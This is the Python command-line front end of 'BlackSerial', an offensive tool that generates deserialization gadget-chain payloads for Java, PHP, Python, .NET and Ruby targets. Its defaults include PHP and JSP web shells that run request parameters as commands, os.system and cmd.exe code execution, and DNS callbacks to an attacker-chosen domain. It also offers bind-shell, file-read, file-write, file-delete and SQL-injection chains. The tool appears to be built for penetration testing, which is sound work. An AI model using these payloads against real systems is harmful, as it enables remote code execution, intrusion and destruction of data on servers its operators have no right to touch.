#!/usr/bin/python3

import argparse
import sys
import logging
import os
from serializers import *

class ColorFormatter(logging.Formatter):
    grey = "\x1b[90m"
    yellow = "\x1b[33;20m"
    red = "\x1b[31m"
    reset = "\x1b[0m"
    blue = "\x1b[0;34m"
    green = "\x1b[1;32m"
    bold_red = "\x1b[31;1m"

    FORMATS = {
        logging.DEBUG: f"{blue}[-]{reset} %(message)s",
        logging.INFO: f"{green}[+]{reset} %(message)s",
        logging.WARNING: f"{yellow}[!] %(message)s{reset}",
        logging.ERROR: f"{red}[!] %(message)s{reset}",
        logging.CRITICAL: f"{bold_red}[!] %(message)s{reset}"
    }

    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt)
        return formatter.format(record)


def setupLogging(no_color, verbose):
    logger = logging.getLogger()
    handler = logging.StreamHandler()
    if no_color:
        handler.setFormatter(logging.Formatter('%(levelname)s - %(message)s'))
    else:
        handler.setFormatter(ColorFormatter())
    logger.addHandler(handler)
    if verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

def createGenerator(serializer, args):
    if serializer in ['phpggc', 'php']:
        generator = PHPGGC(args.phpggc_path, args)
    elif serializer in ['ysoserial', 'java']:
        generator = YSOSerial(args.java_path, args.ysoserial_path, args)
    elif serializer in ['pickle', 'python']:
        generator = Pickle(args)
    elif serializer in ['ysoserial.net', 'csharp']:
        generator = YSOSerialNet(args.wine_path, args.ysoserial_net_path, args)
    elif serializer in ['ruby', 'ruby-unsafe-deserialization']:
        generator = Ruby(args.ruby_path, args.ruby_payload_path, args)
    else:
        logging.error(f"Unsupported serializer: {serializer}")
        generator = None
    
    return generator

if __name__ == '__main__':

    title = "BlackSerial"
    description = "Blackbox Gadget Chain Payloads Generator (@darkpills)"
    default_system_command = 'nslookup %%chain_id%%.%%domain%%'
    available_serializers = ['ysoserial', 'phpggc', 'pickle', 'ysoserial.net', 'ruby-unsafe-deserialization']
    available_languages = ['java', 'php', 'python', 'csharp', 'ruby']

    parser = argparse.ArgumentParser(prog='BlackSerial', description=description, formatter_class=argparse.ArgumentDefaultsHelpFormatter)

    parser.add_argument('chains', help="Specific gadget chain to generate", nargs='*') 

    common_group = parser.add_argument_group('general options')
    common_group.add_argument('-o', '--output', help="Output payloads to file", default="payloads.txt")
    common_group.add_argument('-l', '--list', help="List payloads only", action="store_true")
    common_group.add_argument('-s', '--serializer', help="Serializer or language", choices=available_serializers + available_languages + ['all'], default='phpggc')
    common_group.add_argument('-f', '--unsafe', help="Unsafe gadget chains like File Delete", action="store_true")    
    common_group.add_argument('-n', '--no-color', help='No colored output', action="store_true")
    common_group.add_argument('-nc', '--no-cache', help='Do not use cache of list of chains', action="store_true")
    common_group.add_argument('-v', '--verbose', help="Verbose mode", action="store_true")    
    common_group.add_argument('-o1', '--one-file-per-payload', help="Create one file per payload. Base directory of --output will be taken for that", action="store_true") 

    payload_group = parser.add_argument_group('payload')
    payload_group.add_argument('-c', '--system-command', help="System command executed for all chains, %%domain%% is replaced by --interact-domain parameter and %%chain_id%% by the chain identifier", default=default_system_command)
    payload_group.add_argument('-i', '--interact-domain', help="Domain for listening to outband DNS, HTTP callbacks: collaborator, interactsh...")
    payload_group.add_argument('-rc', '--remote-content', help="Remote content to write in 'File Write' type chains, defaults to jsp-code, php-code, python-code values")
    payload_group.add_argument('-rp', '--remote-port', help="Remote port that will be opened on remote server for bind shell chains", default='54321')
    payload_group.add_argument('-rr', '--remote-file-to-read', help="File path locally read on remote server for 'File Read' type chains: default is C:\\WINDOWS\\System32\\drivers\\etc\\hosts for c# and /etc/hosts for others")
    payload_group.add_argument('-rw', '--remote-file-to-write', help="File path written locally on remote server for 'File Write' type chains, where %%ext%% is php, jsp, py depending on the gadget chain", default='./blackserial.%%ext%%')
    payload_group.add_argument('-rd', '--remote-file-to-delete', help="File path locally on remote server that will be delete if unsafe is enabled for 'File Delete' type chains.", default='index.php')
    payload_group.add_argument('-sq', '--sql', help="SQL query to trigger in 'SQL Injection' chains", default='SELECT SLEEP(15)')

    # output encoding
    encoding_group = parser.add_argument_group('encoding')
    encoding_group.add_argument('-u', '--url', help="URL encodes the payload", action="store_true")
    encoding_group.add_argument('-b', '--base64', help="Base64 encode the payload", action="store_true")
    encoding_group.add_argument('-bu', '--base64-urlsafe', help="Base64 URL safe encode the payload", action="store_true")
    encoding_group.add_argument('-j', '--json', help="JSON encode the payload", action="store_true")
    encoding_group.add_argument('-x', '--hex', help="Encode the payload as hex string", action="store_true")

    # php specific
    phpggc_group = parser.add_argument_group('phpggc')
    phpggc_group.add_argument('--phpggc-path', help="Full path to PHPGGC bin", default="./bin/phpggc/phpggc")
    phpggc_group.add_argument('--php-function', help="PHP Function used for 'RCE: Function Call', 'RCE: PHP Code' and 'File Write'", default='shell_exec')
    phpggc_group.add_argument('--php-code', help="PHP Code or path to a file used for 'RCE: PHP Code' and 'File Write' chains (ex: exploit.php)", default="<?php var_dump(%%php_function%%($_GET['c'])); ?> %%chain_id%%")
    phpggc_group.add_argument('--phpggc-options', help="Options to pass to PHPGGC command line", default="-f")

    # java specific
    ysoserial_group = parser.add_argument_group('ysoserial')
    ysoserial_group.add_argument('--java-path', help="Full path to java bin", default="./bin/jre1.8.0_431/bin/java")
    ysoserial_group.add_argument('--ysoserial-path', help="Full path to ysoserial jar", default="./bin/ysoserial-all.jar")
    ysoserial_group.add_argument('--jsp-code', help="JSP Code or path to a file used for 'File Write' type chains (ex: exploit.jsp)", default="<% Runtime.getRuntime().exec(request.getParameter(\"c\")) %> %%chain_id%%")

    # python specific
    pickle_group = parser.add_argument_group('pickle')
    pickle_group.add_argument('--python-code', help="Python Code or path to a file containing the code", default="import os; os.system('%%system_command%%')")
    
    # .net specific
    net_group = parser.add_argument_group('ysoserial.net')
    net_group.add_argument('--csharp-code', help="C# Code or path to a file containing the C# code (ex: exploit.cs).", default="using System.Diagnostics;public class Exploit{public Exploit(){System.Diagnostics.Process.Start(\"cmd.exe\",\"/c %%system_command%%\");}}")
    net_group.add_argument('--csharp-code-dlls', help="Semicolon list of DLLs dependencies to compile C# code", default="System.dll")
    net_group.add_argument('--csharp-net-remoting', help="URL .Net remoting proxy, transports tcp, http, ipc are supported (https://github.com/codewhitesec/RogueRemotingServer>)", default="http://%%domain%%/%%chain_id%%")
    net_group.add_argument('--ysoserial-net-formatters', help="Only use this list of YSOSerial.net formatters, comma-separated")
    net_group.add_argument('--ysoserial-net-path', help="Full path to YSOSerial.net exe", default="./bin/Release/ysoserial.exe")
    net_group.add_argument('--ysoserial-net-options', help="Options to pass to YSOSerial.net command line", default="")
    net_group.add_argument('--wine-path', help="Full path to wine bin (linux only)", default="wine")

    # ruby specific
    ruby_group = parser.add_argument_group('ruby')
    ruby_group.add_argument('--ruby-path', help="Full path to ruby bin", default="ruby")
    ruby_group.add_argument('--ruby-payload-path', help="Full path to ruby-unsafe-deserialization directory", default="./bin/ruby-unsafe-deserialization")

    args = parser.parse_args()

    setupLogging(args.no_color, args.verbose)

    logging.info(title)

    if '%%domain%%' in args.system_command and args.interact_domain == None and args.system_command == default_system_command:
        logging.warning("Defaulting to 'whoami' payload since no interact domain provided")
        args.system_command = 'whoami'
    elif '%%domain%%' in args.system_command and args.interact_domain == None:
        logging.error(f"No interact domain provided, but %%domain%% placeholder found in system command: {args.system_command}")
        logging.error(f"Use --interact-domain <mydomain> option")
        sys.exit(-1)
    if str(args.interact_domain) == '':
        logging.warning("No interact domain provided, strongly recommanded for out of band detection")
        logging.warning(f"Use --interact-domain <mydomain> option")


    if not args.one_file_per_payload and os.path.isfile(args.output):
        logging.debug(f"Emptying output file {args.output}")
        f = open(args.output, 'wb')
        f.close()

    count = 0
    serializers = available_serializers if args.serializer == 'all' else [args.serializer]
    for serializer in serializers:

        logging.info(f"Using serializer {serializer}")

        # create generator object
        generator = createGenerator(serializer, args)
        if generator == None:
            logging.critical(f'Cannot instanciate serializer: {serializer}')
            sys.exit(-1)

        # make sure generator is available
        logging.debug(f"Checking if all binaries are reachable")
        if not generator.exists():
            logging.critical(f'The program could not be found. Make sure it is installed or in the PATH and all binaries reachable')
            sys.exit(-1)

        # for each php function specified in argument
        logging.info(f"Loading available chains")
        chains = generator.chains()
        logging.info(f"Loaded {len(chains)} chains")

        if args.list:
            for chain in chains:
                print(chain['description'])
            count = count + len(chains)
            continue
        
        else:

            # delete existing payload file
            if args.output and args.output != '-' and os.path.exists(args.output) and os.path.isfile(args.output):
                logging.info(f"Removing existing payload file {args.output}")
                os.remove(args.output)

            if args.chains:
                finalChains = []
                for paramChain in args.chains:
                    found = False
                    for chain in chains:
                        if chain['name'] == paramChain:
                            finalChains.append(chain)
                            found = True
                            break
                    if not found:
                        logging.error(f'Cannot find gadget chain named "{paramChain}" among {len(chains)} loaded chains!')
                        sys.exit(-1)
            else:
                finalChains = chains

            # generate payloads for each language
            count = count + generator.generate(finalChains)

    if args.list:
        logging.info(f"Listed {count} gadget chains")
    else:
        logging.info(f"Generated {count} payloads to {args.output}")

    logging.info(f"Happy hunting!")






    